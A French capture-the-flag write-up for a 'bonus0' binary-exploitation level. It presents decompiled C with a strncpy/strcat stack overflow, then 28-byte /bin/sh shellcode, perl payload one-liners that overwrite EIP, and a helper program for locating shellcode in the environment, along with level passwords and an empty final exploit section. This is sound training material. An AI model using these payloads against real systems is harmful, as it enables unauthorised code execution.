# Bonus0

pass : `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`

## Sources :

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void	p(char *str, char *sep) {
	char buf[4096];  // 0x1008 - 0x8
	puts(sep);
	read(stdin, buf, 4096);
	char *ptr = strchr(buf, '\n');
	*ptr = '\0';
	strncpy(str, buf, 20);  // 0x14
}

void	pp(char *buf) {
	char a[20];  // ebp-0x30
	p(a, " - ");

	char b[20];  // ebp-0x1c
	p(b, " - ");

	strcpy(buf, a);

	int i = 0;
	while (buf[i] != '\0') {
		i++;
	}
	buf[i] = ' ';

	strcat(buf, b);
}

int		main(int ac, char **av) {
	char buf[42];  // 0x40-0x16

	pp(buf);
	puts(buf);

	return (0);
}
```

## Recherche :

Le points d'entrés sont par les 2 calls à `read(stdin, buf, 4096)`.
`strcpy` copie la source dans la destination et rajoute `\0`
`strncpy` fait de même, mais si la taille est atteinte, il ne rajoute pas de `\0` à la fin de sa chaine.

Donc si le premier `read` fait exactement plus de 20 caractères, les 20 premiers caractères vont être copiés dans `a` sans rajouté de `\0` et comme la mémoire est contingente, `a` et `b` se suivent. `strcat` va donc dans `buf` `ab b`

`a` se trouve à l'adresse `0xbffff1e8`
`b` se trouve à l'adresse `0xbffff1fc`

On écrit donc `20 + 20 + 1 + 20` caractères dans `buf` qui dépasse les `42` aloués, et on écrit donc dans la stack.
Et quand on quitte le main, et qu'on déstack, on se retrouve à écrire dans `EIP` et le programme segfault.

```shell
./bonus0
 -
abcdefghijabcdefghij
 -
01234567890123456789
abcdefghijabcdefghij01234567890123456789 01234567890123456789
[1]    3889 segmentation fault  ./bonus0
```

Avec gdb, c'est plus clair, et on voit que `EIP` est réécrit au 13<sup>ème</sup> caractère du second `read`.

Notre shell code de 28 bytes:
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

Les 20 premiers caractères:
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0`
les 8 suivants:
`\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

l'adresse de buf: `0xbffff236`
```
./bonus0 < <(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0"."\n"."A"x(4096-21)."\x0b\xcd\x80\x31\xc0\x40\xcd\x80"."\x90"x(13-8)."\x36\xf2\xff\xbf"."A"x(7-4)."\n"')
```

On va se créer un programme pour retrouver l'adresse de l'env.

getenv.c:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int ac, char **av) {
        char *ptr;

        ptr = getenv(av[1]);
        ptr += strlen(av[0]) - strlen(av[2]);

        printf("%s -- %p\n", av[1], ptr);
        return 0;
}
```
Et on copile avec `gcc getenv.c -o getenv`


On va mettre notre shell code dans une variable d'environnement en laissant un peu de place avant :

`export SHELLCODE="$(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')"`


`export SHELLCODE="$(perl -e 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')`

En lançant `./getenv SHELLCODE ./bonus0`, on trouve `SHELLCODE -- 0xbffff90a`

```
perl -e 'print "A"x(4095)."\n"."B"x(9)."\x23\xf9\xff\xbf"."\n"' > /tmp/a;  cat /tmp/a - | ./bonus0
```

```
perl -e 'print "A"x4095 . "\n" . "B"x9 . "\x11\xf9\xff\xbf" . "B"x7 . "\n"' > /tmp/a ; cat /tmp/a - | ./bonus0
```

`cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`

## Exploit :

```sh

```
